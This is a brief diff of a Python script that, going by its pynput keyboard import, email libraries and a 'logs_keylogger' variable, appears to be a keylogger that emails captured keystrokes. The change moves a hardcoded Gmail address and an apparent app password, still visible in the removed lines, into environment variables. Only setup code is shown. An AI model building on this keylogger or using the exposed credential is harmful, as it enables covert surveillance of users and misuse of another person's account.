@@ -1,9 +1,11 @@
 import smtplib, ssl
 from email.message import EmailMessage
 from pynput import keyboard
+from dotenv import load_dotenv
+import os
 
-email = "johndoveisgoat@gmail.com"
-passwd = "snygbstrarxwmxwt"
+email = os.getenv("email")
+passwd = os.getenv("passwd")
 
 logs_keylogger = ""
 
